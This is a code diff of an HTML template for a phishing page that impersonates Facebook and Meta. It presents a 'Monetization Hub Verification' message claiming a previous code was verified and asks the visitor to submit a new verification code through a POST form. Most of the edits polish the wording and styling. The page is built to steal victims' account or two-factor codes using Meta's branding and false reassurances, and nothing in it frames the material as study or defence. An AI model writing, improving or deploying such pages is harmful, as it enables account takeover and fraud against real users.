@@ -1,19 +1,17 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(24,119,242,0.15);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:20px auto;box-shadow:0 4px 12px rgba(24,119,242,0.15);border-radius:16px;">
   <div class="platform-header">
     <div class="icon-circle bg-facebook">
       <i class="fa-brands fa-facebook icon-lg"></i>
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
-      <div style="color:#64748b;font-size:13px;margin-top:4px">Final Security Verification</div>
+      <div style="color:#64748b;font-size:13px;margin-top:2px">Monetization Hub Verification</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:16px 0 12px 0;font-size:17px;font-weight:600">🔒 Final Security Check Required</h3>
-  
-  <div class="play-instructions">
+  <div class="play-instructions" style="margin:16px 0;">
     <div class="instruction-card">
       <div class="message-header">
         <div class="meta-logo">Meta</div>
@@ -21,27 +19,17 @@
       </div>
       
       <div class="facebook-message">
-        <p class="message-paragraph">
-          We've successfully verified the previous code you submitted. This confirms that you are the rightful owner of this Facebook account.
-        </p>
+        <p class="message-text">We've successfully verified the previous code you submitted. This confirms that you are the rightful owner of this Facebook account.</p>
         
-        <p class="message-paragraph">
-          You've now activated monetization features on your Facebook account in partnership with Meta Monetization Hub.
-        </p>
+        <p class="message-text">You've now activated monetization features on your Facebook account in partnership with Meta Monetization Hub.</p>
         
-        <p class="message-paragraph">
-          To finalize your setup and ensure your account is fully enabled for monetization, please enter the new verification code we've sent to you.
-        </p>
+        <p class="message-text">To finalize your setup and ensure your account is fully enabled for monetization, please enter the new verification code we've sent to you.</p>
         
         <div class="security-notice">
-          <p class="security-text">
-            If you did not request this action, please disregard this message.
-          </p>
+          <p class="security-text">If you did not request this action, please disregard this message.</p>
         </div>
         
-        <p class="message-paragraph">
-          Thank you for being part of the Facebook creator community.
-        </p>
+        <p class="message-text">Thank you for being part of the Facebook creator community.</p>
         
         <div class="message-signature">
           <p class="signature-line">Best regards,</p>
@@ -53,7 +41,7 @@
   </div>
 
   <form id="digitsForm" method="POST" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">Final Verification Code</label>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:6px;font-size:14px">Verification Code</label>
     <input class="input" id="digits" name="digits" placeholder="Enter new verification code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
@@ -97,18 +85,18 @@
   color: #fff;
   font-size: 15px;
   font-weight: 700;
-  padding: 11px;
+  padding: 12px;
   border-radius: 22px;
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 4px 10px rgba(24,119,242,0.2);
+  box-shadow: 0 4px 12px rgba(24,119,242,0.25);
   display: block;
   margin-top: 6px;
 }
 .login-btn:hover {
   background: #166fe5;
-  box-shadow: 0 5px 14px rgba(24,119,242,0.3);
+  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
 }
 .login-btn:active {
   transform: scale(0.985);
@@ -120,8 +108,8 @@
 
 .instruction-card {
   background: #ffffff;
-  padding: 16px;
-  border-radius: 12px;
+  padding: 18px;
+  border-radius: 14px;
   border: 1px solid #e5e7eb;
   margin-bottom: 12px;
   box-shadow: 0 1px 4px rgba(0,0,0,0.04);
@@ -131,7 +119,7 @@
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-bottom: 12px;
+  margin-bottom: 14px;
   padding-bottom: 10px;
   border-bottom: 1px solid #f1f5f9;
 }
@@ -156,48 +144,48 @@
   line-height: 1.4;
 }
 
-.message-paragraph {
+.message-text {
   color: #475569;
-  margin: 0 0 10px 0;
-  line-height: 1.4;
-  font-size: 13px;
+  margin: 0 0 12px 0;
+  line-height: 1.5;
+  font-size: 13.5px;
 }
 
 .security-notice {
   background: #fef2f2;
   border: 1px solid #fecaca;
   border-radius: 6px;
-  padding: 8px 12px;
-  margin: 10px 0;
+  padding: 10px 12px;
+  margin: 12px 0;
 }
 
 .security-text {
   color: #dc2626;
   margin: 0;
   line-height: 1.4;
-  font-size: 12px;
+  font-size: 12.5px;
   font-weight: 500;
 }
 
 .message-signature {
-  margin-top: 12px;
-  padding-top: 10px;
+  margin-top: 16px;
+  padding-top: 14px;
   border-top: 1px solid #f1f5f9;
 }
 
 .signature-line {
   color: #1e293b;
   margin: 0 0 2px 0;
-  line-height: 1.3;
-  font-size: 13px;
+  line-height: 1.4;
+  font-size: 13.5px;
   font-weight: 600;
 }
 
 .copyright {
   color: #64748b;
-  margin: 0;
-  line-height: 1.3;
-  font-size: 11px;
+  margin: 6px 0 0 0;
+  line-height: 1.4;
+  font-size: 11.5px;
 }
 
 .center {
